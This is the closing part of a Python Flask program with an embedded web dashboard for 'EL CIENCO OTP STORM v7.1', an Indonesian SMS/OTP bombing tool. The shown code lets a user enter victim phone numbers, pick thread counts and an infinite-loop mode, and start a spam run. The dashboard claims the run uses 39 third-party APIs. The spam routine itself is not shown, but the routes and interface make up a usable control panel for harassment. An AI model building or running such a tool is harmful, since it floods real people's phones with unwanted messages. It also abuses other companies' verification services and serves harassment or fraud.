        .card h3 { color: #00ff41; margin-bottom: 10px; font-size: 0.9em; }
        label { display: block; margin: 8px 0 3px 0; color: #888; font-size: 0.8em; }
        textarea, select { width: 100%; background: #1a1a1a; border: 1px solid #333; color: #00ff41; padding: 8px 10px; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 0.9em; }
        textarea { min-height: 80px; resize: vertical; }
        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
        button { padding: 10px 20px; border: none; border-radius: 6px; font-family: 'Courier New', monospace; font-weight: bold; cursor: pointer; transition: all 0.3s; flex: 1; min-width: 80px; }
        button:hover { transform: scale(1.02); filter: brightness(1.2); }
        button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
        .btn-start { background: #00ff41; color: #0a0a0a; }
        .btn-stop { background: #ff0040; color: white; }
        .btn-clear { background: #ffaa00; color: #0a0a0a; }
        .log-box { background: #050505; border: 1px solid #1a1a1a; height: 350px; overflow-y: auto; padding: 8px; border-radius: 6px; font-size: 0.75em; line-height: 1.5; }
        .log-box::-webkit-scrollbar { width: 4px; }
        .log-box::-webkit-scrollbar-track { background: #0a0a0a; }
        .log-box::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 3px; }
        .log-entry { border-bottom: 1px solid #0a0a0a; padding: 2px 0; }
        .log-success { color: #00ff41; }
        .log-error { color: #ff4444; }
        .log-warning { color: #ffaa00; }
        .log-info { color: #88ccff; }
        .footer { margin-top: 20px; text-align: center; color: #333; font-size: 0.7em; border-top: 1px solid #1a1a1a; padding-top: 15px; }
        .status-text { color: #888; font-size: 0.8em; margin-top: 5px; }
        @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } .title { font-size: 1.2em; } .stat-card .num { font-size: 1.3em; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="title">☣ EL CIENCO <small>· OTP STORM v7.1</small></div>
        <div class="badge stopped" id="statusBadge">● IDLE</div>
    </div>

    <div class="stats">
        <div class="stat-card success"><div class="num" id="totalSent">0</div><div class="label">Total OTP</div></div>
        <div class="stat-card success"><div class="num" id="successCount">0</div><div class="label">✅ Berhasil</div></div>
        <div class="stat-card failed"><div class="num" id="failedCount">0</div><div class="label">❌ Gagal</div></div>
        <div class="stat-card"><div class="num" id="apiCount">39</div><div class="label">📡 API Aktif</div></div>
    </div>

    <div class="grid">
        <div class="card">
            <h3>⚙ KONTROL</h3>
            <label>📱 NOMOR TARGET</label>
            <textarea id="targets" placeholder="+6281234567890">+6281234567890</textarea>
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                <div><label>🧵 THREAD</label><select id="threads"><option value="1">1</option><option value="3">3</option><option value="5" selected>5</option><option value="10">10</option><option value="20">20</option></select></div>
                <div><label>🔄 MODE</label><select id="mode"><option value="single">Single Round</option><option value="infinite">Infinite Loop</option></select></div>
            </div>
            <div class="btn-group">
                <button class="btn-start" id="btnStart" onclick="startSpam()">▶ START</button>
                <button class="btn-stop" id="btnStop" onclick="stopSpam()" disabled>⏹ STOP</button>
                <button class="btn-clear" onclick="clearLogs()">🗑 CLEAR</button>
            </div>
            <div class="status-text" id="statusText">Status: Menunggu perintah...</div>
        </div>
        <div class="card">
            <h3>📋 LIVE LOG</h3>
            <div class="log-box" id="logBox">
                <div class="log-entry log-info">[SISTEM] EL CIENCO v7.1 siap, El Manco.</div>
                <div class="log-entry log-info">[SISTEM] 39 API siap digunakan</div>
            </div>
        </div>
    </div>
    <div class="footer">EL CIENCO v7.1 · 39 API · Unlimited · No License</div>
</div>

<script>
var isRunning = false;

function addLog(msg, level) {
    if (!level) level = 'info';
    var box = document.getElementById('logBox');
    var div = document.createElement('div');
    div.className = 'log-entry log-' + level;
    var time = new Date().toLocaleTimeString();
    div.textContent = '[' + time + '] ' + msg;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
    if (box.children.length > 500) box.removeChild(box.firstChild);
}

function updateUI(running) {
    var badge = document.getElementById('statusBadge');
    var startBtn = document.getElementById('btnStart');
    var stopBtn = document.getElementById('btnStop');
    var statusText = document.getElementById('statusText');
    if (running) {
        badge.className = 'badge running';
        badge.textContent = '● RUNNING';
        startBtn.disabled = true;
        stopBtn.disabled = false;
        statusText.textContent = 'Status: 🔴 SPAM BERJALAN...';
        statusText.style.color = '#00ff41';
    } else {
        badge.className = 'badge stopped';
        badge.textContent = '● IDLE';
        startBtn.disabled = false;
        stopBtn.disabled = true;
        statusText.textContent = 'Status: ⏹ Berhenti';
        statusText.style.color = '#ff4444';
    }
}

function clearLogs() {
    document.getElementById('logBox').innerHTML = '';
    addLog('[SISTEM] Log dibersihkan', 'warning');
}

function startSpam() {
    var targets = document.getElementById('targets').value.split(/[\\n,]+/).map(function(t) { return t.trim(); }).filter(function(t) { return t; });
    if (targets.length === 0) {
        alert('Masukkan minimal 1 nomor target!');
        return;
    }
    
    var btn = document.getElementById('btnStart');
    btn.disabled = true;
    btn.textContent = '⏳ LOADING...';
    
    var data = {
        targets: targets,
        threads: parseInt(document.getElementById('threads').value),
        mode: document.getElementById('mode').value
    };
    
    fetch('/api/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(function(res) { return res.json(); })
    .then(function(result) {
        if (result.status === 'error') {
            alert('Error: ' + result.message);
        } else {
            addLog('[SISTEM] ' + result.message, 'success');
        }
        btn.disabled = false;
        btn.textContent = '▶ START';
    })
    .catch(function(e) {
        alert('Gagal terhubung ke server: ' + e.message);
        btn.disabled = false;
        btn.textContent = '▶ START';
    });
}

function stopSpam() {
    var btn = document.getElementById('btnStop');
    btn.disabled = true;
    btn.textContent = '⏳ STOPPING...';
    
    fetch('/api/stop', { method: 'POST' })
    .then(function(res) { return res.json(); })
    .then(function(result) {
        addLog('[SISTEM] ' + result.message, 'warning');
        btn.disabled = false;
        btn.textContent = '⏹ STOP';
    })
    .catch(function(e) {
        alert('Gagal stop: ' + e.message);
        btn.disabled = false;
        btn.textContent = '⏹ STOP';
    });
}

function refreshStats() {
    fetch('/api/stats')
    .then(function(res) { return res.json(); })
    .then(function(data) {
        if (data.stats) {
            document.getElementById('totalSent').textContent = data.stats.total || 0;
            document.getElementById('successCount').textContent = data.stats.success || 0;
            document.getElementById('failedCount').textContent = data.stats.failed || 0;
        }
        isRunning = data.running || false;
        updateUI(isRunning);
    })
    .catch(function(e) {});
}

function refreshLogs() {
    fetch('/api/logs')
    .then(function(res) { return res.json(); })
    .then(function(data) {
        if (data.logs && data.logs.length > 0) {
            var box = document.getElementById('logBox');
            // Tampilkan 10 log terakhir
            var logs = data.logs.slice(-10);
            for (var i = 0; i < logs.length; i++) {
                var msg = logs[i];
                var level = 'info';
                if (msg.includes('✅')) level = 'success';
                else if (msg.includes('❌')) level = 'error';
                else if (msg.includes('⚠️') || msg.includes('⏳')) level = 'warning';
                var div = document.createElement('div');
                div.className = 'log-entry log-' + level;
                div.textContent = msg;
                box.appendChild(div);
            }
            if (box.children.length > 500) {
                while (box.children.length > 300) {
                    box.removeChild(box.firstChild);
                }
            }
            box.scrollTop = box.scrollHeight;
        }
    })
    .catch(function(e) {});
}

setInterval(refreshStats, 1000);
setInterval(refreshLogs, 1000);

refreshStats();
addLog('[SISTEM] Dashboard siap digunakan, El Manco.', 'success');
</script>
</body>
</html>
'''

# ============ ROUTES ============
@app.route('/')
def index():
    return HTML

@app.route('/api/stats')
def api_stats():
    return jsonify({
        'running': is_running,
        'stats': stats,
        'logs': log_messages[-30:],
    })

@app.route('/api/logs')
def api_logs():
    return jsonify({
        'logs': log_messages,
        'count': len(log_messages)
    })

@app.route('/api/start', methods=['POST'])
def api_start():
    global is_running, spam_thread, stop_flag
    if is_running:
        return jsonify({'status': 'error', 'message': 'Spam sudah berjalan'})
    
    data = request.json
    targets = data.get('targets', [])
    threads = int(data.get('threads', 5))
    mode = data.get('mode', 'single')
    
    if not targets:
        return jsonify({'status': 'error', 'message': 'Masukkan nomor target'})
    
    valid_targets = []
    for t in targets:
        t = t.strip()
        if not t:
            continue
        norm = normalize(t)
        if norm:
            valid_targets.append(norm)
    
    if not valid_targets:
        return jsonify({'status': 'error', 'message': 'Format nomor tidak valid (gunakan 08xx atau +62xx)'})
    
    stop_flag = False
    is_running = True
    
    def run():
        run_spam(valid_targets, threads, mode)
    
    spam_thread = threading.Thread(target=run)
    spam_thread.daemon = True
    spam_thread.start()
    
    return jsonify({'status': 'success', 'message': f'Spam dimulai ke {len(valid_targets)} nomor dengan {len(TARGETS)} API'})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    global is_running, stop_flag
    if not is_running:
        return jsonify({'status': 'error', 'message': 'Spam tidak sedang berjalan'})
    
    stop_flag = True
    is_running = False
    log_message("⏹ Perintah STOP diterima - menghentikan semua thread...", "warning")
    
    return jsonify({'status': 'success', 'message': 'Spam dihentikan'})

# ============ MAIN ============
if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║  ☣ EL CIENCO - OTP STORM WEB DASHBOARD v7.1            ║
    ║  39 API LENGKAP · Unlimited · No License                ║
    ║  ✅ STOP LANGSUNG BERHENTI                              ║
    ║  ✅ LOG REAL-TIME PER API                               ║
    ║                                                         ║
    ║  🌐 http://localhost:5000                               ║
    ║  📱 Akses dari HP: http://IP-ANDA:5000                 ║
    ║                                                         ║
    ║  Tekan CTRL+C untuk stop server                        ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    webbrowser.open('http://localhost:5000')
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
